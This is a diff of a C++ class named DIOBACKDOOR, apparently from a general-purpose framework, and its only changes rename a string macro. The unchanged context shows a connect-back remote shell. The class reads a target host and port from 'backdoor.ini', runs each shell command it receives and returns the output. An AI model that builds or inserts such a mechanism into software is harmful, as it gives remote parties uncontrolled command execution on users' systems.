@@ -48,7 +48,7 @@
 
 /*---- DEFINES & ENUMS  ----------------------------------------------------------------------------------------------*/
 
-#define DIOBACKDOOR_CFGREMOTENAMEFILE       __L("backdoor.ini")
+#define DIOBACKDOOR_CFGREMOTENAMEFILE       _L("backdoor.ini")
 #define DIOBACKDOOR_DEFAULTPORT             3540
 
 /*---- CLASS ---------------------------------------------------------------------------------------------------------*/
@@ -120,11 +120,11 @@ class DIOBACKDOOR
                                                         XSTRING section;
                                                         XSTRING value;
 
-                                                        section.Format(__L("ENTRY%02d"), c);
+                                                        section.Format(_L("ENTRY%02d"), c);
 
                                                         if(!fileini->SelectSection(section)) break;
 
-                                                        status = fileini->ReadValue(__L("isactive"), value);
+                                                        status = fileini->ReadValue(_L("isactive"), value);
                                                         if(status)
                                                           {
                                                             if(value.ConvertToBoolean())
@@ -135,7 +135,7 @@ class DIOBACKDOOR
                                                                     XSTRING _publicIP;
                                                                     XSTRING _localIP;
 
-                                                                    status = fileini->ReadValue(__L("urlorigin"), (*urlorigin));
+                                                                    status = fileini->ReadValue(_L("urlorigin"), (*urlorigin));
                                                                     if(status)
                                                                       {
                                                                         bool validaccess = false;
@@ -146,7 +146,7 @@ class DIOBACKDOOR
                                                                           {
                                                                             validaccess = true;
 
-                                                                            status = fileini->ReadValue(__L("localip"), _localIP);
+                                                                            status = fileini->ReadValue(_L("localip"), _localIP);
                                                                             if(status)
                                                                               {
                                                                                 if(_localIP.GetSize())
@@ -159,10 +159,10 @@ class DIOBACKDOOR
                                                                         if(validaccess)
                                                                           {
 
-                                                                            status = fileini->ReadValue(__L("urltarget"), value);
+                                                                            status = fileini->ReadValue(_L("urltarget"), value);
                                                                             if(status) GetURLTarget()->Set(value);
 
-                                                                            status = fileini->ReadValue(__L("port"), value);
+                                                                            status = fileini->ReadValue(_L("port"), value);
                                                                             if(status) SetPort(value.ConvertToInt());
 
                                                                             result = true;
@@ -216,7 +216,7 @@ class DIOBACKDOOR
                                         if(!diostream->WaitToConnected(10)) return false;
                                       }
 
-                                    xthreadconnection = CREATEXTHREAD(XTHREADGROUPID_UNGROUP, __L("DIOBACKDOOR::DIOBACKDOOR"), ThreadRunFunction, (void*)this);
+                                    xthreadconnection = CREATEXTHREAD(XTHREADGROUPID_UNGROUP, _L("DIOBACKDOOR::DIOBACKDOOR"), ThreadRunFunction, (void*)this);
                                     if(xthreadconnection) xthreadconnection->Ini();
 
                                     return true;
@@ -334,12 +334,12 @@ class DIOBACKDOOR
 
                                         GEN_XPATHSMANAGER.GetPathOfSection(XPATHSMANAGERSECTIONTYPE_ROOT, xpath);
                                         xpath.Slash_Add();
-                                        xpath.Add(__L("backscreen"));
+                                        xpath.Add(_L("backscreen"));
 
                                         XSTRING command;
                                         int     returncode = 0;
 
-                                        command.Format(__L("%s > %s"), backdoor->commandreceived.Get(), xpath.Get());
+                                        command.Format(_L("%s > %s"), backdoor->commandreceived.Get(), xpath.Get());
 
                                         if(GEN_XSYSTEM.MakeCommand(command.Get(), &returncode))
                                           {
@@ -354,7 +354,7 @@ class DIOBACKDOOR
                                                           {
                                                             XSTRING string = xfiletxt->GetLine(c)->Get();
 
-                                                            string.Add(__L("\n\r"));
+                                                            string.Add(_L("\n\r"));
 
                                                             XBUFFER line;
                                                             
